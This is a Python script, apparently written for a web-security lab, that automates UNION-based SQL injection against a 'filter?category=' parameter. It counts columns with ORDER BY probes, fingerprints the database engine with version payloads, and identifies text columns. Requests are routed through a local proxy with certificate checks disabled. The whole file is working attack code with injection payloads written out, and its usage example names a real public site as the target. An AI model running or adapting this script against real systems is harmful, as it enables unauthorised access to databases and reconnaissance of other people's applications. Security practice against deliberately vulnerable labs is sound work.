import sys

import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

DB = None


def find_number_of_columns(base_url):
    sql_comments = ["--", "#", "/*", "-- "]
    num_of_col = 0
    max_num_col = 0
    for comment in sql_comments:
        num_of_col = 0
        for i in range(1, 50):
            uri = f"filter?category='ORDER BY {i}{comment}"
            r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
            if r.status_code != 200:
                num_of_col = i - 1
                if num_of_col > max_num_col:
                    max_num_col = num_of_col
                break
        if num_of_col > 0:
            print(
                f"{Fore.GREEN}[+] Number of columns: {num_of_col}{Fore.RESET}, for comment: {comment}"
            )
    return max_num_col


def exploit_sqli_column_text(base_url, num_of_col):
    uri = "filter?category=Gifts'"
    found = 0
    payload = "'a'"
    for i in range(num_of_col):
        variation = ["NULL"] * num_of_col
        variation[i] = payload
        str_variation = ", ".join(variation)
        py = f" UNION select {str_variation}--"
        if DB == "ORACLE":
            py = f" UNION select {str_variation} FROM dual--"
        # print(base_url + uri + py)
        r = requests.get(base_url + uri + py, proxies=proxies, verify=False, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}[$] Column {i} is NOT of type text{Fore.RESET}")
            continue
        payload_matches = r.text.find(payload[1:-1])
        if payload_matches != -1:
            print(f"{Fore.GREEN}[%] Column {i} is of type text{Fore.RESET}")
            found += 1

    if found:
        return True
    return False


def find_sql_version(base_url, num_of_col):
    global DB
    uri = "filter?category=Gifts'"
    payloads = [
        "banner FROM v$version",
        "version FROM v$instance",
        "@@version",
        "version()",
    ]
    versions = ["ORACLE", "ORACLE", "MSTF OR MySQL", "POSTGRES"]

    for index, payload in enumerate(payloads):
        variation = ["NULL"] * num_of_col
        variation[num_of_col - 1] = payload
        str_variation = ", ".join(variation)
        py = f" UNION select {str_variation}--"
        # print(base_url + uri + py)
        r = requests.get(base_url + uri + py, proxies=proxies, verify=False, timeout=5)

        if r.status_code != 200:
            print(f"{Fore.RED}[&] DB is NOT {versions[index]}{Fore.RESET}")
        else:
            DB = versions[index]
            print(f"{Fore.GREEN}[&] DB is {versions[index]}{Fore.RESET}")


def exploit_sqli(base_url):
    num_of_col = find_number_of_columns(base_url)
    find_sql_version(base_url, num_of_col)
    found = exploit_sqli_column_text(base_url, num_of_col)
    if found:
        return num_of_col

    return 0


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f'[-] Example: {sys.argv[0]} www.google.com"')
        sys.exit(-1)

    number_of_columns = exploit_sqli(url)
    if number_of_columns <= 0:
        print("[-] Exploit failed")
